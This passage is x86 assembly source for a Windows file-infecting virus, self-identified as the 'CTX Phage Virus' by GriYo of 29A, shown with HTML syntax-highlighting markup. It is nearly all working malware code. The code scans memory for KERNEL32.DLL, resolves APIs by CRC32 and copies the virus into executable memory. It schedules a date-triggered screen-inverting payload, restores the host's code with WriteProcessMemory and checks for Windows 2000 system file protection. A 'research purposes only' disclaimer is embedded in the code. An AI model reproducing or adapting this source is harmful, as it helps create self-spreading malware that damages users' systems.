        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">         </span><span class="sc1">; mov eax,imm</span><span class="sc0">
</span><span class="sc5">ViralChecksum</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">critical_error</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">KernelScanning</span><span class="sc0">

</span><span class="sc5">CRC_protected</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Scan system memory looking for KERNEL32.DLL</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">KernelScanning</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">fK32_try_01</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">080000101h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IGetNtBaseAddr</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">fK32_try_02</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">kernel_found</span><span class="sc0">
</span><span class="sc5">fK32_try_02</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0C0000101h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IGetNtBaseAddr</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">fK32_try_03</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">kernel_found</span><span class="sc0">
</span><span class="sc5">fK32_try_03</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IGetNtBaseAddr</span><span class="sc0">
</span><span class="sc5">kernel_found</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">critical_error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ebx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;This is the entry-point for 1st generation</span><span class="sc0">
        </span><span class="sc1">;Now EBX points to KERNEL32.DLL base address</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">entry_1st_gen</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hKERNEL32</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Search for GetProcAddress entry-point</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetGetProcAddr</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">critical_error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetProcAddress</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get KERNEL32 API addresses</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumK32Apis</span><span class="sc0">              
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CRC32K32Apis</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">epK32Apis</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_APIs</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">API_sucksexee</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Everything have to work, but if something goes wrong this</span><span class="sc0">
        </span><span class="sc1">;will halt the process</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">critical_error</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">critical_error</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Virus ready to infect, but first we need to allocate some </span><span class="sc0">
        </span><span class="sc1">;memory for buffers</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">API_sucksexee</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">alloc_size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_VirtualAlloc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">critical_error</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Copy virus to allocated memory and continue execution there</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">viro_sys</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">size_virtual</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">go_mem</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">viro_sys</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Just a stupid payload</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetUser32</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'USER32.DLL'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">GetUser32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_LoadLibraryA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitPayload</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetGetDC</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetDC'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">GetGetDC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetProcAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">freeUSER32</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">freeUSER32</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetGDI32</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GDI32.DLL'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">GetGDI32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_LoadLibraryA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">freeUSER32</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetBitBlt</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'BitBlt'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">GetBitBlt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetProcAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">freeGDI32</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00550009h</span><span class="sc0">  </span><span class="sc1">; Raster operation DSTINVERT</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; Destination Y</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; Destination X</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; Destination DC</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000600h</span><span class="sc0">  </span><span class="sc1">; Height</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000800h</span><span class="sc0">  </span><span class="sc1">; Width</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; Source Y</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; Source X</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; Source DC</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">freeGDI32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_FreeLibrary</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">freeUSER32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_FreeLibrary</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ExitPayload</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Copyright notice and disclaimer</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[ '</span><span class="sc0">

</span><span class="sc5">copyright</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' CTX Phage Virus BioCoded by GriYo / 29A '</span><span class="sc0">

</span><span class="sc5">disclaimer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' Disclaimer: This software has been designed'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' for research purposes only. The author is'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' not responsible for any problems caused due to'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' improper or illegal usage of it '</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' ]'</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;End of virus critical initialization</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get in-memory delta offset</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">go_mem</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_mem_delta</span><span class="sc0">
</span><span class="sc5">get_mem_delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_mem_delta</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get current local time</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">local_time</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetLocalTime</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Initialize random number generator seed</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Activate payload now?</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">activate_month</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skip_payload</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">activate_day</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skip_payload</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">activate_hour</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skip_payload</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Time to do something funny</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">payload</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Set when files infected by the virus will activate</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">skip_payload</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LT_Month</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0006h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000Ch</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">month_is_ok</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000Ch</span><span class="sc0">
</span><span class="sc5">month_is_ok</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">activate_month</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LT_Day</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">activate_day</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LT_Hour</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">activate_hour</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Locate KERNEL32 code section in memory</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_code_sh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">K32CodeStart</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">K32CodeEnd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Restore host code</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">HostRetry</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">cPushad</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_org_code</span><span class="sc0">

</span><span class="sc5">org_code</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">get_org_code</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetCurrentProcess</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_WriteProcessMemory</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;If this fails try again and again...</span><span class="sc0">
        </span><span class="sc1">;Any better solution?</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">HostRetry</span><span class="sc0"> 

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Check for Windows2000 SFP</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">system_version</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00000094h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetVersionEx</span><span class="sc4">]</span><span class="sc0">
